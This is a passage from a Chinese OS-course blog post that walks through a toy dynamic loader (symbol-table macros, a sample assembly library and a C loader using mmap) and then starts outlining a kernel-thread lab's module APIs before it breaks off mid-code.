由于是一个小的演示demo，所以这里定义了自己的一个非常简单的动态链接库标准</p><ol><li>该动态链接库需要程序员自己手动加载，而非类似<strong>ld.so</strong>的自动递归的加载动态链接库。并且动态链接库的查找目录是固定的，和可执行程序处于同一个目录</li><li>动态链接库的符号表必须位于固定位置(这里实现的就是位于动态链接库的起始位置)</li><li>动态链接库需要编译成位置无关代码</li></ol><p>  首先，我们规定一个符号的数据结构，从而生成前面分析事提到的符号表，如下所示<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SYMBOL_SIZE (64)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYMBOL_TYPE_TERMINATE(0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYMBOL_TYPE_IMPORT(1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYMBOL_TYPE_EXPORT(2)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">SYMBOL</span> &#123;</span></span><br><span class="line"><span class="type">uint64_t</span> offset;</span><br><span class="line"><span class="type">uint64_t</span> type;</span><br><span class="line"><span class="type">char</span> name[SYMBOL_SIZE - <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>) - <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)];</span><br><span class="line">&#125; Symbol;</span><br></pre></td></tr></table></figure></p><p>  实际上，其包括符号的地址以及符号特征(符号名称)等信息。而为了导入符号和导出符号公用一个数据结构，我们添加了<strong>type</strong>字段用来进行区分。<br>  自定义的标准中要求将符号表放置在动态链接库的起始位置。为了使生成的动态链接库满足上述的标准，我们可以通过汇编代码，以及<strong>objcopy</strong>命令，生成raw文件，而非<strong>ELF</strong>格式的文件。为了方便汇编代码的操作，我们定义了如下的一些宏<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __ASSEMBLER__</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 这里主要定义一些汇编指令下的宏，方便编写汇编源代码</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个符号表的起始</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DYNLIB_SYMSsymbols_start:</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 定义一个符号表的终结</span></span><br><span class="line"><span class="comment"> * .align ALIGN GAP;按ALIGN对齐下一个符号，中间使用GAP填充</span></span><br><span class="line"><span class="comment"> * .fill REPEAT, SIZE, VALUE;将SIZE大小的VALUE值拷贝REPEAT次</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DYNLIB_SYMS_END.align SYMBOL_SIZE, 0; \</span></span><br><span class="line"><span class="meta">.fill SYMBOL_SIZE, 1, 0; </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 在汇编源代码中，定义导出表</span></span><br><span class="line"><span class="comment"> * 其中包含相对载入基址的相对偏移，以及符号特征</span></span><br><span class="line"><span class="comment"> * .quad VALUE定义了一个QUAD类型的数据，其值为VALUE</span></span><br><span class="line"><span class="comment"> * .asciz VALUE使用ASCII字符声明VALUE文本字符串，并在结尾自动添加结束符\0</span></span><br><span class="line"><span class="comment"> * #VAR将宏参数转换为字符常量</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXPORT(name) .align SYMBOL_SIZE, 0; \</span></span><br><span class="line"><span class="meta">.quad (name - symbols_start); \</span></span><br><span class="line"><span class="meta">.quad SYMBOL_TYPE_EXPORT; \</span></span><br><span class="line"><span class="meta">.asciz #name;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 在汇编源代码中，定义导入表</span></span><br><span class="line"><span class="comment"> * 其中包含符号待解析地址，以及符号特征</span></span><br><span class="line"><span class="comment"> * .quad VALUE定义了一个QUAD类型的数据，其值为VALUE</span></span><br><span class="line"><span class="comment"> * .ascii VALUE使用ASCII字符声明VALUE文本字符串，结尾没有结束符\0</span></span><br><span class="line"><span class="comment"> * str1##str2将两个token连接为字符常量</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMPORT(name) .align SYMBOL_SIZE, 0; \</span></span><br><span class="line"><span class="meta">name##_dyn: \</span></span><br><span class="line"><span class="meta">.quad 0; \</span></span><br><span class="line"><span class="meta">.quad SYMBOL_TYPE_IMPORT; \</span></span><br><span class="line"><span class="meta">.asciz #name; \</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 前面汇编源代码中仅仅实现了相关动态链接库的符号标记</span></span><br><span class="line"><span class="comment"> * 这里是上述动态链接库的具体符号标记的含义</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">SYMBOL</span> &#123;</span></span><br><span class="line"><span class="type">uint64_t</span> offset;</span><br><span class="line"><span class="type">uint64_t</span> type;</span><br><span class="line"><span class="type">char</span> name[SYMBOL_SIZE - <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>) - <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>)];</span><br><span class="line">&#125; Symbol;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span><span class="comment">//__ASSEMBLER__</span></span></span><br></pre></td></tr></table></figure></p><p>  可以看到，其主要实现了汇编文件中定义<strong>struct SYMBOL</strong>结构体的操作，即<strong>IMPORT(NAME)</strong>和<strong>EXPORT(NAME)</strong>。对于导入符号来说，其最终的符号地址需要在载入的时候进行解析，因此将<strong>offset</strong>字段填充为0即可，在载入的时候，导入的符号已经加载进内存了，则将该符号的地址覆盖到符号的<strong>offset</strong>字段即可，其余按照标准和结构体字段的含义进行填充即可；而对于导出符号来说，其最终的符号地址虽然不知道，但是其相对动态链接库加载地址的偏移始终是不变的，则先将该值填充为相对偏移值即可，等载入的时候，在<strong>offset</strong>字段添加动态链接库的载入地址即可</p><p>  下面是一个动态链接库的具体样例，如下所示<br>  <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include <span class="string">&quot;dynamic.h&quot;</span></span><br><span class="line"></span><br><span class="line">// 将导入导出表放置在最开始</span><br><span class="line">DYNLIB_SYMS</span><br><span class="line"></span><br><span class="line">// 导出libb_fun导出</span><br><span class="line">EXPORT(libb_func)</span><br><span class="line"></span><br><span class="line">// 导入liba<span class="number">.</span>S中的liba_var导出</span><br><span class="line">IMPORT(liba_func)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 这里导入导出表结束</span><br><span class="line">DYNLIB_SYMS_END</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">libb_func:</span></span><br><span class="line"><span class="keyword">call</span> *liba_func_dyn(%rip)</span><br><span class="line">addq <span class="number">$1</span>, %rax</span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure></p><p>  这里唯一需要说明的就是动态链接库中，对于导入符号的调用。虽然在编译的时候，并不知道导入符号的最终地址，但是在该动态链接库载入的时候，该动态链接库的导入符号一定已经被载入内存中。则在动态链接库载入的过程中，将导入符号的地址写入导入符号表的<strong>offset</strong>中即可。也就是虽然在编译的时候，并不知道导入符号的最终地址，但是可以确定导入符号的地址是在导入符号表的<strong>offset</strong>字段的，而导入符号表的地址在编译时可以通过相对偏移进行访问，从而也就保证了动态链接库在载入完后可以通过导入符号表正确调用导入的符号。</p><p>  最后，则是程序调用动态链接库的相关说明。根据前面的说明，实际上程序在加载动态链接库的时候，唯一的工作就是处理动态链接库的符号表</p><ol><li>对于导出符号类型，将其<strong>struct SYMBOL</strong>的<strong>offset</strong>字段添加上动态链接库的载入地址，从而获得符号的真实地址。除此之外，还需要保存一份<strong>struct SYMBOL</strong>，方便之后动态链接库的导入符号的解析以及程序调用该导入符号</li><li><p>对于导入符号类型，根据标准，其依赖的动态链接库已经完成加载，则所调用的导入符号也已经完成了解析。则遍历前面1.步骤中保存的符号表，找到该符号，并且覆盖该动态链接库导入符号的<strong>offset</strong>字段，从而确保该动态链接库调用导入符号的正常执行。</p><p>演示代码如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;dynamic.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 当前程序加载的动态链接库中所有的程序</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> Symbol *symbols[<span class="number">128</span>] = &#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> symbols_size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 处理动态链接库中导入符号类型的符号</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">do_type_import_symol</span><span class="params">(Symbol *symbol)</span></span><br><span class="line">&#123;</span><br><span class="line">assert(symbol-&gt;type == SYMBOL_TYPE_IMPORT);</span><br><span class="line"><span class="keyword">if</span>(symbol == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] try to resolve the import symbol:%s\n&quot;</span>, symbol-&gt;name);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历程序的符号表，如果找到符号特征(符号名称)相同的，则解析符号即可</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; symbols_size; ++i) &#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(symbol-&gt;name, symbols[i]-&gt;name)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] succeed to resolve the import symbol:%s\n&quot;</span>, symbol-&gt;name);</span><br><span class="line">symbol-&gt;offset = (<span class="type">uint64_t</span>)symbols[i]-&gt;offset;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] failed to resolve the import symbol:%s\n&quot;</span>, symbol-&gt;name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 处理动态链接库中导出符号类型的符号</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">do_type_export_symbol</span><span class="params">(Symbol *symbol, <span class="type">void</span> *base_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">assert(symbol-&gt;type == SYMBOL_TYPE_EXPORT);</span><br><span class="line"><span class="keyword">if</span>(symbol == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] try to resolve the export symbol:%s\n&quot;</span>, symbol-&gt;name);</span><br><span class="line"></span><br><span class="line">symbols[symbols_size] = symbol;</span><br><span class="line">symbols[symbols_size]-&gt;offset += (<span class="type">uint64_t</span>)base_addr;</span><br><span class="line">++symbols_size;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] succeed to resolve the export symbol:%s\n&quot;</span>, symbol-&gt;name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 这里根据库的名称</span></span><br><span class="line"><span class="comment"> * 加载当前目录下的.o文件即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">load</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *lib_name)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(lib_name == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] try to load the %s\n&quot;</span>, lib_name);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> lib_name_len = <span class="built_in">strlen</span>(lib_name);</span><br><span class="line"><span class="type">char</span> *lib_path = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>) * (lib_name_len + <span class="number">2</span> + <span class="number">7</span>));</span><br><span class="line">assert(lib_path != <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(lib_path, <span class="string">&quot;./%s.dynlib&quot;</span>, lib_name);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] try to load the %s with path:%s\n&quot;</span>, lib_name, lib_path);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span>((fd = open(lib_path, O_RDONLY)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] fail to open the %s\n&quot;</span>, lib_name);</span><br><span class="line"><span class="built_in">free</span>(lib_path);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过mmap映射</span></span><br><span class="line"><span class="type">void</span> *base_addr = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span>((base_addr = mmap(<span class="literal">NULL</span>, <span class="number">4096</span>, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, <span class="number">0</span>)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] fail to load the %s\n&quot;</span>, lib_name);</span><br><span class="line"><span class="built_in">free</span>(lib_path);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 由于每一个动态链接的符号表在其首部</span></span><br><span class="line"><span class="comment"> * 则依次遍历即可</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 如果是导出表，则向全局符号表中添加符号即可</span></span><br><span class="line"><span class="comment"> * 如果是导入表，则遍历全局符号表，查找对应的符号即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">for</span>(Symbol *symbol = (Symbol*)base_addr; symbol-&gt;type != SYMBOL_TYPE_TERMINATE; ++symbol) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] symbol address =&gt; %p\n&quot;</span>, symbol);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] try to load the symbol: %s\n&quot;</span>, symbol-&gt;name);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="keyword">switch</span>(symbol-&gt;type) &#123;</span><br><span class="line"><span class="keyword">case</span> SYMBOL_TYPE_IMPORT:</span><br><span class="line">do_type_import_symol(symbol);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> SYMBOL_TYPE_EXPORT:</span><br><span class="line">do_type_export_symbol(symbol, base_addr);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] succeed to load the %s\n&quot;</span>, lib_name);</span><br><span class="line"><span class="built_in">free</span>(lib_path);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 调用动态链接库中的符号表</span></span><br><span class="line"><span class="comment"> * 即遍历程序所有的符号表，找出给定的符号特征并且执行即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">do_execute_symbol</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(name == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] try to execute the symbol:%s\n&quot;</span>, name);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历程序的符号表，如果找到符号特征(符号名称)相同的，则执行符号即可</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; symbols_size; ++i) &#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(name, symbols[i]-&gt;name)) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] the address of the symbol:%s is %lx\n&quot;</span>, name, symbols[i]-&gt;offset);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] %s() = %ld\n&quot;</span>, name, ((<span class="type">uint64_t</span> (*)())symbols[i]-&gt;offset)());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] failed to execute the symbol:%s\n&quot;</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">load(<span class="string">&quot;liba&quot;</span>);</span><br><span class="line">do_execute_symbol(<span class="string">&quot;liba_func&quot;</span>);</span><br><span class="line">load(<span class="string">&quot;libb&quot;</span>);</span><br><span class="line">do_execute_symbol(<span class="string">&quot;libb_func&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里给出<a href="dynamic_loader.tar.gz">动态链接程序的加载器demo</a></p></li></ol><h1 id="L2多处理器内核上的线程管理-kmt"><a href="#L2多处理器内核上的线程管理-kmt" class="headerlink" title="L2多处理器内核上的线程管理(kmt)"></a>L2多处理器内核上的线程管理(kmt)</h1><h2 id="实验背景"><a href="#实验背景" class="headerlink" title="实验背景"></a>实验背景</h2><p>  实际上，借助AbstractMachine提供的机制(C Runtime、物理内存、中断/异常等)，可以很容易地实现CPU地虚拟化，并对进程/线程进行模拟。</p><p>  目前，我们已经知道操作系统的<strong>虚拟化</strong>是由<em>中断机制</em>实现的，在进程/线程执行时，当<strong>中断</strong>到来时，操作系统代码开始执行并保存处理器运行的寄存器现场；在中断返回时，其会选择任何一个进程/线程已经保存的寄存器现场进行恢复，从而实现上下文的切换。</p><p>  在此实验中，我们需要实现多处理器操作系统内核中的内核线程API。在完成这个实验后，就可以得到一个真正的嵌入式操作系统。</p><h2 id="实验描述"><a href="#实验描述" class="headerlink" title="实验描述"></a>实验描述</h2><blockquote><h3 id="实验总览"><a href="#实验总览" class="headerlink" title="实验总览"></a>实验总览</h3><p>这个实验在L1的基础上，进一步实现内核线程相关的操作系统内核API：</p><ul><li>相比Lab1，os模块中新增了<strong>trap</strong>和<strong>on_irq</strong>两个函数，分别是系统中唯一中断/系统调用的入口和中断处理程序的回调注册；</li><li>pmm模块保持不变，可以沿用Lab1的实现，但因为这个实验中多了中断，需要进行一些小的修改；</li><li>新增了kmt模块，需要完成<code>struct task</code>、<code>struct spinlock</code>和<code>struct semaphore</code>的定义，并实现其中全部的API<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> Context *(*<span class="type">handler_t</span>)(Event, Context *);</span><br><span class="line">MODULE(os) &#123;</span><br><span class="line"> <span class="type">void</span> (*init)();</span><br><span class="line"> <span class="type">void</span> (*run)();</span><br><span class="line"> Context *(*trap)(Event ev, Context *context);</span><br><span class="line"> <span class="type">void</span> (*on_irq)(<span class="type">int</span> seq, <span class="type">int</span> event, <span class="type">handler_t</span> handler);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">MODULE(pmm) &#123;</span><br><span class="line"> <span class="type">void</span>  (*init)();</span><br><span class="line"> <span class="type">void</span> *(*alloc)(<span class="type">size_t</span> size);</span><br><span class="line"> <span class="type">void</span>  (*<span class="built_in">free</span>)(<span class="type">void</span> *ptr);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">task</span> <span class="title">task_t</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">spinlock_t</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">semaphore</span> <span class="title">sem_t</span>;</span></span><br><span class="line">MODULE(kmt) &#123;</span><br><span class="line"> <span class="type">void</span> (*init)();</span><br><span class="line"> <span class="type">int</span>  (*create)(<span class="type">task_t</span> *task, <span class="type">const</span> <span class="type">char</span> *name, <span class="type">void</span> (*entry)(<span class="type">void</span> *arg), <span class="type">void</span> *arg);</span><br><span class="line"> <span class="type">void</span> (*teardown)(<span class="type">task_t</span> *task);</span><br><span class="line"> <span class="type">void</span> (*spin_init)(<span class="type">spinlock_t</span> *lk, <span class="type">const</span> <span class="type">char</span> *name);</span><br><span class="line"> <span class="type">void</span> (*spin_lock)(<span class="type">spinlock_t</span> *lk);</span><br><span class="line"> <span class="type">void</span> (*spin_unlock)(<span class="type">spinlock_t</span> *lk);</span><br><span class="line"> 